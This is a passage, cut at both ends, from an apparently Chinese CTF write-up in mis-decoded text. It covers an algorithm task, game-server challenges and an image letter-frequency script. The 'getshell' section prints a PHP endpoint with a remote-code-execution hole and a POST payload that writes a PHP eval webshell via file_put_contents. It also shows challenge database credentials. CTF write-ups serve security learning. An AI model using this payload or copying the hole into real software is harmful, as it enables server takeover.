çš„ç”Ÿå‘½å€¼ä¸º $H$ã€‚</p><p>æ¥ä¸‹æ¥ $N$ è¡Œï¼Œè¡¨ç¤º $N$ ä¸ª Smith çš„å±æ€§ï¼Œæ¯è¡Œæ ¼å¼ä¸º $AH$ï¼Œå…¶ä¸­</p><p>- $A$ ä¸ºè¯¥ Smith çš„æ”»å‡»å€¼ ($1 \le A \le 1000$)ã€‚</p><p>- $H$ ä¸ºè¯¥ Smith çš„ç”Ÿå‘½å€¼ ($1 \le H \le 1000$)ã€‚</p><p><strong>Output</strong></p><p>è¾“å‡ºä¸€ä¸ªæ•´æ•°ï¼Œè¡¨ç¤ºæ‰€éœ€è¦çš„æœ€å°æ”»å‡»å€¼ã€‚å¦‚æœæ— æ³•ä¿è¯å‡»è´¥ Smith ä»¬åˆ™è¾“å‡º <code>-1</code>ã€‚</p><p><strong>Hint</strong></p><p>Neo å’Œ Smith ä»¬æ˜¯ <code>å®æ—¶æˆ˜æ–—åˆ¶</code>ï¼ˆéå›åˆåˆ¶ï¼‰ï¼Œå³ Neo å’Œ Smith ä»¬å¯ä»¥<strong>åŒæ—¶</strong>æ”»å‡»å¯¹æ–¹ï¼Œåªä¸è¿‡ Neo ä¸€ä¸ªæ—¶é—´åªèƒ½æ‰“ä¸€ä¸ª Smithï¼Œ</p><p>è€Œ Smith ä»¬å¯ä»¥ç¾¤æ®´ Neoï¼ˆä¸ç”¨è€ƒè™‘ç¢°æ’ä½“ç§¯çš„é—®é¢˜ï¼‰ã€‚</p><p>å¯ä»¥å‡å®š Neo å’Œ Smith ä»¬æ¯å•ä½æ—¶é—´åªèƒ½<strong>å‡»æ‰“å¯¹æ‰‹ä¸€æ¬¡</strong>ã€‚ä¾‹å¦‚ï¼ŒæŸä¸ª Smith ç”Ÿå‘½å€¼ä¸º 20ï¼Œè€Œ Neo æ”»å‡»å€¼ä¸º 15ï¼Œé‚£ Neo ä¹Ÿéœ€è¦æ¶ˆè€—</p><p>ä¸¤ä¸ªå•ä½çš„æ—¶é—´æ¥æ¶ˆç­è¯¥ Smithï¼ŒåŒæ—¶æ„å‘³ç€æœ‰ 10 å•ä½çš„æ”»å‡»åŠ›è¢«æµªè´¹æ‰äº†ã€‚</p><p>Smith ä¸€æ—¦å—åˆ° Neo çš„æ”»å‡»ï¼Œå°±ä¼šåœæ­¢å‡»æ‰“ Neoã€‚ä¾‹å¦‚ Neo å’Œ Smith æŸä¸€ä¸ªæ—¶åˆ»åŒæ—¶æ”»å‡»å¯¹æ–¹ï¼ŒNeo åˆ™ä¸ä¼šå—åˆ°ä¼¤å®³ã€‚</p></blockquote><p>è´ªå¿ƒç®—æ³•+äºŒåˆ†æŸ¥æ‰¾æœ€å°æ”»å‡»å€¼ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> functools <span class="keyword">import</span> cmp_to_key</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">custom_sort</span>(<span class="params">x, y</span>):</span><br><span class="line">    <span class="keyword">return</span> y[<span class="number">0</span>] * x[<span class="number">2</span>] - x[<span class="number">0</span>] * y[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_min_attack</span>(<span class="params">neo_life, smiths</span>):</span><br><span class="line">    l = <span class="number">1</span></span><br><span class="line">    r = <span class="number">1000</span></span><br><span class="line">    ans = -<span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> l &lt;= r:</span><br><span class="line">        m = (l + r) // <span class="number">2</span></span><br><span class="line">        s = [(k[<span class="number">0</span>], k[<span class="number">1</span>], (k[<span class="number">1</span>]+m-<span class="number">1</span>)//m) <span class="keyword">for</span> k <span class="keyword">in</span> smiths]</span><br><span class="line">        s.sort(key=cmp_to_key(custom_sort))</span><br><span class="line">        res = <span class="number">0</span></span><br><span class="line">        t = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(s)):</span><br><span class="line">            res += t*s[i][<span class="number">0</span>]</span><br><span class="line">            t += s[i][<span class="number">2</span>]</span><br><span class="line">        <span class="keyword">if</span> res &lt; neo_life:</span><br><span class="line">            ans = m</span><br><span class="line">            r = m - <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            l = m + <span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">N, H = <span class="built_in">list</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split()))</span><br><span class="line">smiths = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(N):</span><br><span class="line">    smiths.append(<span class="built_in">tuple</span>(<span class="built_in">map</span>(<span class="built_in">int</span>,<span class="built_in">input</span>().split())))</span><br><span class="line">    </span><br><span class="line"><span class="built_in">print</span>(find_min_attack(H, smiths))</span><br></pre></td></tr></table></figure><p>â€‹    </p><h2 id="gaming"><a href="#gaming" class="headerlink" title="gaming"></a>gaming</h2><h3 id="æ¸¸æˆæ¥å’¯"><a href="#æ¸¸æˆæ¥å’¯" class="headerlink" title="æ¸¸æˆæ¥å’¯"></a>æ¸¸æˆæ¥å’¯</h3><p>ç™»å½•æ¸¸æˆå°±åœ¨å…¬å‘Šæ çœ‹åˆ°flagï¼š<code>flag&#123;churusanguo&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="æ”»åŸæ‹”å¯¨"><a href="#æ”»åŸæ‹”å¯¨" class="headerlink" title="æ”»åŸæ‹”å¯¨"></a>æ”»åŸæ‹”å¯¨</h3><p>è¾¾åˆ°ä¸€å®šç­‰çº§åæ¸¸æˆå†…ä¼šæ”¶åˆ°é‚®ä»¶ï¼ŒæŒ‰ <strong>getshell</strong> ä¸€é¢˜æ‹¿åˆ°æƒé™åï¼Œæ‰¾åˆ° <code>D:/APMServ5.2.6/www/htdocs/server/config/db.php</code>ï¼Œå¾—åˆ°mysqlæ•°æ®åº“è´¦å·å¯†ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_persistent&#x27;</span>,<span class="number">1</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_RDBMS&#x27;</span>, <span class="string">&#x27;mysql&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Username&#x27;</span>, <span class="string">&#x27;sgphp1g2ame&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Password&#x27;</span>, <span class="string">&#x27;@Qwer123456&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Server&#x27;</span>, <span class="string">&#x27;127.0.0.1&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Port&#x27;</span>, <span class="string">&#x27;3306&#x27;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&#x27;db_Database&#x27;</span>, <span class="string">&#x27;bloodwar&#x27;</span>);</span><br></pre></td></tr></table></figure><p>åœ¨èšå‰‘ç”¨mysqlè¿æ¥ï¼Œè´¦å· <code>sgphp1g2ame</code>ï¼Œå¯†ç  <code>@Qwer123456</code>ï¼Œåœ¨è¡¨ <code>sys_mail_sys_content</code> ä¸­æ‰¾åˆ°é‚®ä»¶å†…å®¹ï¼š<code>æ­å–œæ­å–œ, flag2 flag&#123;jiaguanjinjueN&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="ç‰¹æ®Šç©å®¶"><a href="#ç‰¹æ®Šç©å®¶" class="headerlink" title="ç‰¹æ®Šç©å®¶"></a>ç‰¹æ®Šç©å®¶</h3><p>æœ‰ç©å®¶çš„åå­—æ˜¯flagï¼ŒæŒ‰ <strong>getshell</strong> ä¸€é¢˜æ‹¿åˆ°æƒé™åï¼Œæºç è‡ªå¸¦ä¿®æ”¹å™¨ï¼Œæ‰“å¼€å‰ä¿®æ”¹é…ç½®æ–‡ä»¶ <code>config.ini</code>ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">[config]</span><br><span class="line">IP=120.55.42.64</span><br><span class="line">æ•°æ®åº“=bloodwar</span><br><span class="line">è´¦å·=sgphp1g2ame</span><br><span class="line">å¯†ç =@Qwer123456</span><br><span class="line">ç«¯å£=3306</span><br><span class="line">è·¯å¾„=D:\APMServ5.2.6\www\htdocs\images\armor</span><br><span class="line">èŠå¤©ç«¯å£=5308</span><br><span class="line">ç™»å½•ä¿¡æ¯=</span><br></pre></td></tr></table></figure><p>æ‰“å¼€ä¿®æ”¹å™¨ï¼Œåœ¨ç”¨æˆ·åŸºæœ¬ä¿¡æ¯å‘ç°ç”¨æˆ·å <code>flag&#123;mysqlwo&#125;</code>ã€‚</p><p>â€‹    </p><h3 id="getshell"><a href="#getshell" class="headerlink" title="getshell"></a>getshell</h3><p>åœ¨æºç  <code>APMServ5.2.6/www/htdocs/server/game/BattleNetGateway.php</code> ä¸­å‘ç°å®¹æ˜“æ§åˆ¶ä¼ å€¼çš„ä»£ç ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;interface.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;utils.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;HeroFunc.php&quot;</span>);</span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&quot;BattleNetServices.php&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">define</span>(<span class="string">&quot;BATTLE_NET_KEY&quot;</span>,<span class="string">&quot;M7XDFCR9WRRGRQ9ETBQ6&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!<span class="title function_ invoke__">defined</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>)) &#123;<span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(PHP_OS, <span class="number">0</span>, <span class="number">3</span>) == <span class="string">&#x27;WIN&#x27;</span>) <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;;&#x27;</span>); <span class="keyword">else</span> <span class="title function_ invoke__">define</span>(<span class="string">&#x27;PATH_SEPARATOR&#x27;</span>, <span class="string">&#x27;:&#x27;</span>);&#125;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&#x27;include_path&#x27;</span>,<span class="title function_ invoke__">ini_get</span>(<span class="string">&#x27;include_path&#x27;</span>).PATH_SEPARATOR.<span class="title function_ invoke__">realpath</span>(<span class="string">&quot;../&quot;</span>)); </span><br><span class="line"></span><br><span class="line"><span class="variable">$param</span>=<span class="variable">$_POST</span>;</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">empty</span>(<span class="variable">$param</span>))<span class="variable">$param</span>=<span class="variable">$_GET</span>;</span><br><span class="line"><span class="variable">$from_uid</span>=<span class="variable">$param</span>[<span class="string">&quot;from_uid&quot;</span>];</span><br><span class="line"><span class="variable">$sign</span>=<span class="variable">$param</span>[<span class="string">&quot;sign&quot;</span>];</span><br><span class="line"><span class="variable">$commandFunc</span>=<span class="variable">$param</span>[<span class="string">&quot;commandFunc&quot;</span>];</span><br><span class="line"><span class="variable">$content</span>=<span class="title function_ invoke__">urldecode</span>(<span class="variable">$param</span>[<span class="string">&quot;content&quot;</span>]);</span><br><span class="line"><span class="variable">$content_encoding</span>=<span class="variable">$param</span>[<span class="string">&quot;content-encoding&quot;</span>];</span><br><span class="line"><span class="comment">//$tt=$from_uid.$commandFunc.$content.BATTLE_NET_KEY;</span></span><br><span class="line"> </span><br><span class="line"> </span><br><span class="line"></span><br><span class="line"><span class="variable">$ret</span>=<span class="keyword">array</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$sign</span>!=<span class="title function_ invoke__">md5</span>(<span class="variable">$from_uid</span>.<span class="variable">$commandFunc</span>.<span class="variable">$content</span>.BATTLE_NET_KEY))  <span class="comment">//signä¸ºä¼ å…¥å€¼ä¸keyè¿æ¥å­—ç¬¦ä¸²çš„md5å€¼</span></span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">0</span>;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="number">1</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">explode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$content</span>);  <span class="comment">//æŒ‰|åˆ†å‰²contentä¼ å…¥å†…å®¹</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="variable">$inputParams</span>[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); <span class="comment">//RCEæ¼æ´</span></span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$inputParams</span>=<span class="title function_ invoke__">json_decode</span>(<span class="variable">$content</span>,<span class="literal">true</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">is_array</span>(<span class="variable">$inputParams</span>)&amp;&amp;<span class="title function_ invoke__">count</span>(<span class="variable">$inputParams</span>)==<span class="number">1</span>)&#123;</span><br><span class="line">     <span class="variable">$inputParams</span>=<span class="title function_ invoke__">array_shift</span>(<span class="variable">$inputParams</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$ret</span>[]=<span class="variable">$commandFunc</span>(<span class="variable">$from_uid</span>,<span class="variable">$inputParams</span>); </span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$ret</span> = <span class="keyword">array</span>(<span class="number">0</span>=&gt;<span class="number">0</span>);</span><br><span class="line"><span class="variable">$ret</span>[] = <span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$content_encoding</span>==<span class="string">&quot;csv&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$ret</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="keyword">print</span> <span class="title function_ invoke__">json_encode</span>(<span class="variable">$ret</span>);</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>æ­¤å¤„å¯ä»¥RCEï¼Œåˆ†æä»£ç é€»è¾‘ï¼Œåˆ©ç”¨ <code>file_put_contents</code> å†™å…¥ä¸€å¥è¯æœ¨é©¬ï¼š</p><p>POST: <code>from_uid=xx.php&amp;commandFunc=file_put_contents&amp;content=&lt;%3fphp%20%40eval($_POST[xxx])%3b&amp;content-encoding=csv&amp;sign=734c00692057aaf9f6c763f405cbec6b</code></p><p>èšå‰‘è¿æ¥ï¼Œåœ¨D:ç›®å½•ä¸‹æ‰¾åˆ° <code>flag.txt</code>ï¼Œflagï¼š<code>flag&#123;breakItAndOutIt&#125;</code>ã€‚</p><p>â€‹    </p><h2 id="other"><a href="#other" class="headerlink" title="other"></a>other</h2><h3 id="æ–‡å­—é¢‘ç‡åˆ†æ"><a href="#æ–‡å­—é¢‘ç‡åˆ†æ" class="headerlink" title="æ–‡å­—é¢‘ç‡åˆ†æ"></a>æ–‡å­—é¢‘ç‡åˆ†æ</h3><p>éé¢„æœŸè§£æ³•ï¼Œå°†1000Ã—1000å›¾ç‰‡åˆ†å‰²ä¸º400å¼ 50Ã—50çš„å›¾ç‰‡ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">f&#x27;img/<span class="subst">&#123;c&#125;</span>.png&#x27;</span>)</span><br><span class="line">        c += <span class="number">1</span></span><br></pre></td></tr></table></figure><p>æµ‹è¯•å‘ç°ç›¸åŒå­—æ¯çš„å›¾ç‰‡ï¼Œå…¶æ–‡ä»¶md5å€¼ç›¸åŒï¼Œåˆ©ç”¨æ­¤è§„å¾‹ç»Ÿè®¡å­—é¢‘ï¼Œå…ˆæ“ä½œä¸€æ¬¡æ‰¾å‡º26ä¸ªå­—æ¯å¯¹åº”æ–‡ä»¶çš„md5å€¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">sample = [<span class="number">7</span>,<span class="number">38</span>,<span class="number">28</span>,<span class="number">0</span>,<span class="number">73</span>,<span class="number">13</span>,<span class="number">42</span>,<span class="number">18</span>,<span class="number">36</span>,<span class="number">102</span>,<span class="number">12</span>,<span class="number">3</span>,<span class="number">2</span>,<span class="number">19</span>,</span><br><span class="line">    <span class="number">9</span>,<span class="number">58</span>,<span class="number">20</span>,<span class="number">1</span>,<span class="number">5</span>,<span class="number">30</span>,<span class="number">50</span>,<span class="number">24</span>,<span class="number">11</span>,<span class="number">22</span>,<span class="number">8</span>,<span class="number">66</span>]</span><br><span class="line"></span><br><span class="line">m = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">400</span>):</span><br><span class="line">    path = <span class="string">fr&#x27;C:\Users\admin\Desktop\img\&#123;i&#125;.png&#x27;</span></span><br><span class="line">    m.append(md5(<span class="built_in">open</span>(path,<span class="string">&#x27;rb&#x27;</span>).read()).hexdigest())</span><br><span class="line"></span><br><span class="line">res = Counter(m)</span><br><span class="line"><span class="built_in">print</span>(res)</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(res))</span><br><span class="line"></span><br><span class="line">alp_md5 = [m[sample[i]] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">26</span>)]</span><br><span class="line"><span class="built_in">print</span>(alp_md5)</span><br><span class="line"></span><br><span class="line"><span class="comment"># å¾—åˆ°md5å¯¹åº”list</span></span><br><span class="line"><span class="comment"># [&#x27;d108ad1582e37a825d092131a55babcc&#x27;, &#x27;9901603c7d2a5dde25723c9e569428da&#x27;, &#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;, &#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;, &#x27;33ff92480ee08585d901ffd0a47de021&#x27;, &#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;, &#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;, &#x27;4497c04cea4897727d88f7945bc86d77&#x27;, &#x27;047fd19a9a30301444e11394ee99d8be&#x27;, &#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;, &#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;, &#x27;109d33cf832c83ebebca8c4f165862a9&#x27;, &#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;, &#x27;121808a4d3f160f235f27cb77355d525&#x27;, &#x27;b15356da578f67bac5a3d777913ce97d&#x27;, &#x27;a174639d2070109e85ffb53657d5c9d5&#x27;, &#x27;e30a3ca0d2f0326a10175e8d6ed8a178&#x27;, &#x27;a267e80b28a9dae7e2c5d70198e808d7&#x27;, &#x27;e1e4b54464f7ae41ba2c71a9244d7347&#x27;, &#x27;ccf09a4c80cc7e4b3134ea53f423ec38&#x27;, &#x27;5b5480bc64f225e422ed8f084e629ff8&#x27;, &#x27;f17c5f58bf983a684cc8d7d4b3c1ae0b&#x27;, &#x27;287d3dac4e058281282e0eee00d9ddd4&#x27;, &#x27;a782a16d1fca70e6217e45dd3fe8ae6e&#x27;, &#x27;18cad01f22ca7c4bc9a7536474d17273&#x27;, &#x27;a4e1c4687c9c785271fc24f79aa2e0f0&#x27;]</span></span><br></pre></td></tr></table></figure><p>å†ç»¼åˆèµ·æ¥è§£é¢˜ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> hashlib <span class="keyword">import</span> md5</span><br><span class="line"><span class="keyword">from</span> pwnlib.util.iters <span class="keyword">import</span> mbruteforce</span><br><span class="line"><span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"><span class="keyword">from</span> collections <span class="keyword">import</span> Counter</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">&quot;47.97.127.1&quot;</span>,<span class="number">20382</span>)</span><br><span class="line"></span><br><span class="line">table = <span class="string">&#x27;0123456789abcdef&#x27;</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">pow</span>():</span><br><span class="line">    r.recvuntil(<span class="string">&quot;plaintext: &quot;</span>)</span><br><span class="line">    suffix = r.recv(<span class="number">26</span>).decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;md5_hex -&gt; &quot;</span>)</span><br><span class="line">    cipher = r.recvline().strip().decode(<span class="string">&quot;utf8&quot;</span>)</span><br><span class="line">    proof = mbruteforce(<span class="keyword">lambda</span> x: md5((suffix+x).encode()).hexdigest() ==</span><br><span class="line">                        cipher, table, length=<span class="number">6</span>, method=<span class="string">&#x27;fixed&#x27;</span>)</span><br><span class="line">    r.sendlineafter(<span class="string">&#x27;&gt; &#x27;</span>, suffix+proof)</span><br><span class="line">    </span><br><span class="line"><span class="built_in">pow</span>()</span><br><span class="line"></span><br><span class="line">r.recvline()</span><br><span class="line"></span><br><span class="line"><span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>,<span class="string">&#x27;wb&#x27;</span>).write(b64decode(r.recvline().strip()))</span><br><span class="line"></span><br><span class="line">im = Image.<span class="built_in">open</span>(<span class="string">&#x27;word.png&#x27;</span>)</span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">        box = (<span class="number">50</span>*i,<span class="number">50</span>*j,<span class="number">50</span>*(i+<span class="number">1</span>),<span class="number">50</span>*(j+<span class="number">1</span>))</span><br><span class="line">        region = im.crop(box)</span><br><span class="line">        region.save(<span class="string">&#x27;img/&#123;&#125;.png&#x27;</span>.<span class="built_in">format</span>(c))</span><br><span class="line">        c += <span class="number">1</span></span><br><span class="line">        </span><br><span class="line">sample = [<span class="string">&#x27;d108ad1582e37a825d092131a55babcc&#x27;</span>, <span class="string">&#x27;9901603c7d2a5dde25723c9e569428da&#x27;</span>, <span class="string">&#x27;5e47df30ddf5e623c9bbcd4fde58ec88&#x27;</span>, <span class="string">&#x27;5bf0c7d972b37455dc32777ffdad86b9&#x27;</span>, <span class="string">&#x27;33ff92480ee08585d901ffd0a47de021&#x27;</span>, <span class="string">&#x27;3d3f026d8fc719c35a917d98d9b7474b&#x27;</span>, <span class="string">&#x27;c07bd9475b8e9d65334e2f24f19794b3&#x27;</span>, <span class="string">&#x27;4497c04cea4897727d88f7945bc86d77&#x27;</span>, <span class="string">&#x27;047fd19a9a30301444e11394ee99d8be&#x27;</span>, <span class="string">&#x27;802d7d3a2c02a1b6ba5f0860b70b54df&#x27;</span>, <span class="string">&#x27;52d9844a5ed4eee07af4f48f880e3d5b&#x27;</span>, <span class="string">&#x27;109d33cf832c83ebebca8c4f165862a9&#x27;</span>, <span class="string">&#x27;f5252d81a8afc71cf5dd29270a398beb&#x27;</span>, <span class="string">&#x27;121808a4d3f160f235f27cb77355d525&#x27;</span>, <span class="string">&#x27;b15356da578f67bac5a3d777913ce97d&#x27;</span>, <span class="string">&#x27;a174639d2070109e85ffb53657d5c9d5&#x27;</span>, 